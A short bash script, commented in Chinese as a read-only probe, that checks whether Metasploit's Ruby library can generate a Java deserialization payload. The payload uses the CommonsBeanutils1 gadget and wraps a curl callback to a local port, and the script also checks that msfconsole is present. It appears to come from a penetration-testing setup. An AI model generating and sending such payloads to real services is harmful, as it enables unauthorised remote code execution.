#!/bin/bash
# 只读：C1 payload 生成能力探测（msf ruby API / msfconsole）
echo "=== ruby ==="
command -v ruby && ruby -v
echo "=== msf ruby lib load test ==="
cd /usr/share/metasploit-framework 2>/dev/null && ruby -Ilib -e '
begin
  require "msf/util/java_deserialization"
  require "rex/text"
  b = Msf::Util::JavaDeserialization.ysoserial_payload("CommonsBeanutils1", "curl -s http://127.0.0.1:8099/probe", modified_type: "bash")
  puts "MSF_LIB_OK len=#{b.length} magic=#{b[0,4].unpack1("H*")}"
  puts "B64=" + Rex::Text.encode_base64(b)[0,60]
rescue Exception => e
  puts "MSF_LIB_FAIL #{e.class}: #{e.message}"
end
' 2>&1 | tail -5
echo "=== msfconsole available ==="
command -v msfconsole && msfconsole --version 2>&1 | head -2
echo "=== DONE ==="
